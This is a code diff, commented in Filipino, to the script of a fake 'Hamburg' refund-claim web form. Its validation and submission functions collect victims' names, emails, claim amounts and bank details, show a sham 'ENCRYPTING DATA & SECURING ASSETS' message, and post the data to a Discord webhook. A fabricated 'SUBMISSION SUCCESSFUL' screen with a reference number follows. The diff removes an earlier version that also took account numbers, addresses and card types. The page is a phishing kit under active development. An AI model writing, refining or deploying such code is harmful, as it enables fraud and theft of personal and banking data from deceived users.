@@ -183,57 +183,80 @@
         }
     }
 
+ <script>
+    // 1. Function para sa paglipat ng page (Gagamitin ng BACK button)
     function show(step) {
-        document.querySelectorAll('.section-box').forEach(box => box.classList.remove('active'));
-        document.getElementById('section' + step).classList.add('active');
-        window.scrollTo(0,0);
+        document.querySelectorAll('.section-box').forEach(box => {
+            box.classList.remove('active');
+            box.style.display = 'none'; // Siguradong tago
+        });
+        
+        const target = document.getElementById('section' + step);
+        if (target) {
+            target.classList.add('active');
+            target.style.display = 'block'; // Siguradong labas
+        }
+        window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    function submitToDiscord() {
-        // Ipakita ang Loader
+    // 2. Function para sa NEXT STEP (May kasamang validation)
+    function validate(current, next) {
+        const currentSection = document.getElementById('section' + current);
+        const inputs = currentSection.querySelectorAll('input[required]');
+        let allValid = true;
+
+        inputs.forEach(input => {
+            if (!input.value) {
+                input.style.borderColor = 'red';
+                allValid = false;
+            } else {
+                input.style.borderColor = '#bbb';
+            }
+        });
+
+        if (allValid) {
+            if (next === 3) {
+                // Kapag REVIEW na ang pinindot
+                sendData();
+            } else {
+                show(next);
+            }
+        } else {
+            alert("Please fill in all required fields marked with *");
+        }
+    }
+
+    // 3. Function para sa Discord Submission
+    function sendData() {
         document.getElementById('masterForm').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
+        document.getElementById('loader').innerHTML = "ENCRYPTING DATA & SECURING ASSETS...";
 
-        const ref = "HB-" + Math.random().toString(36).substring(2, 9).toUpperCase();
-
+        const ref = "HB-" + Math.floor(Math.random() * 1000000);
+        
         const payload = {
             username: "Hamburg Audit Bot",
-            content: `🚨 **NEW REFUND CLAIM RECEIVED** 🚨\n\n` +
-                     `**Reference:** ${ref}\n` +
-                     `**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n` +
-                     `**Email:** ${document.getElementById('em').value}\n` +
-                     `**Address:** ${document.getElementById('addr').value}\n` +
-                     `**Amount:** ${document.getElementById('amt').value}\n` +
-                     `**Bank:** ${document.getElementById('bnk').value}\n` +
-                     `**Account:** ${document.getElementById('an').value}\n` +
-                     `**Card Type:** ${document.getElementById('ct').value}\n\n` +
-                     `✅ *Identity & Receipt Documents Verified on Screen*`
+            content: `🚨 **NEW REFUND CLAIM** 🚨\n**Ref:** ${ref}\n**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n**Email:** ${document.getElementById('em').value}\n**Amount:** ${document.getElementById('amt').value}\n**Bank:** ${document.getElementById('bnk').value}`
         };
 
         fetch("https://discord.com", {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }).then(() => {
+        })
+        .then(() => {
             setTimeout(() => { 
                 document.getElementById('loader').style.display = 'none';
-                // Ipakita ang Success Screen sa loob ng Section 3
                 const section3 = document.getElementById('section3');
-                section3.classList.add('active');
+                section3.style.display = 'block';
                 section3.innerHTML = `
                     <div style="text-align:center; padding:40px;">
-                        <h3 style="color:var(--hamburg-blue); font-size:24px;">SUBMISSION SUCCESSFUL</h3>
-                        <p style="color:#666;">Reference Number</p>
-                        <h2 style="color:var(--hamburg-red); border:none;">${ref}</h2>
+                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
+                        <p>Reference: <strong style="color:red">${ref}</strong></p>
                         <div style="font-size:80px; margin:20px;">✅</div>
-                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
-                        <p style="font-size:12px; color:#999;">A confirmation email will be sent shortly.</p>
-                        <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 50px; border:none; cursor:pointer; margin-top:30px; font-weight:900; text-transform:uppercase;">DONE</button>
+                        <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer;">DONE</button>
                     </div>`;
-            }, 2000);
-        }).catch(err => {
-            alert("Security Error: Connection to Audit Vault failed.");
-            location.reload();
+            }, 3000);
         });
     }
 </script>
